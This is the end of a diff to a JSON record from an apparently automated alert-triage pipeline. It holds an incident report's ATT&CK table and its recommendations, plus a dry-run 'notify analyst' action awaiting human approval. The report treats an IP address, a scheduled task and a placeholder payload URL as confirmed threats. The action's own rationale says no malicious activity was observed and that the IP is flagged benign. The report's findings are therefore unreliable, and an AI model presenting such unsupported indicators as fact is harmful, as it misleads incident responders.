|\n| T1057 | Process Discovery | Enumerate running processes. |\n| T1046 | Network Service Scanning | Identify open ports/services. |\n| T1105 | Remote File Copy | Download additional payloads/tools. |\n\n---\n\n## Recommendations  \n\n1. **Containment**  \n   * Immediately terminate the scheduled task `UpdateTask`.  \n   * Block outbound traffic to 185.44.12.7 and quarantine `http://malicious.com/payload.exe`.  \n   * Isolate WORKSTATION\u201107 from the network until a full forensic analysis is completed.\n\n2. **Detection & Monitoring**  \n   * Deploy PowerShell logging (module `Microsoft.PowerShell.Core\\ScriptBlockLogging`).  \n   * Enable scheduled\u2011task monitoring (Wazuh rule `100300`).  \n   * Correlate outbound connections to known malicious IPs/URLs in real time.\n\n3. **Mitigation**  \n   * Enforce AppLocker or Software Restriction Policies to block unsigned PowerShell scripts.  \n   * Require code\u2011signing for all scripts and executables.  \n   * Harden privileged account management (least\u2011privilege, MFA).  \n\n4. **Investigation**  \n   * Conduct a full endpoint forensic analysis (process tree, registry, scheduled tasks).  \n   * Review network logs for additional outbound connections from the host.  \n   * Cross\u2011reference with threat intelligence feeds for the IP and URL.\n\n5. **Future Prevention**  \n   * Implement a Web Application Firewall (WAF) to block malicious downloads.  \n   * Deploy an EDR solution with behavioral analytics to detect anomalous script execution.  \n   * Regularly update threat intelligence feeds and IOC blocklists.\n\n---\n\n**Prepared by:**  \nSenior Threat Intelligence Analyst  \n[Signature]  \n\n---",
+    "actions_taken": [
+      {
+        "action": {
+          "action_type": "notify_analyst",
+          "target": "WORKSTATION-07",
+          "severity": "medium",
+          "rationale": "Three Wazuh alerts were generated on WORKSTATION-07 with no process, command line, or IP details. Two alerts are weakly linked (confidence 0.1\u20130.2) to ATT&CK technique T1059 (Command and Scripting Interpreter). No concrete malicious activity, file, or network connection has been observed, and the only listed IP (185.44.12.7) is flagged as benign. Given the low confidence and lack of actionable evidence, the appropriate response is to notify the analyst for further investigation rather than taking disruptive actions.",
+          "technique_id": "T1059",
+          "confidence": 0.2
+        },
+        "status": "pending_approval",
+        "detail": "Awaiting human approval (run actions/review_pending.py).",
+        "dry_run": true
+      }
+    ],
+    "errors": [],
+    "metadata": {}
   }
 ]
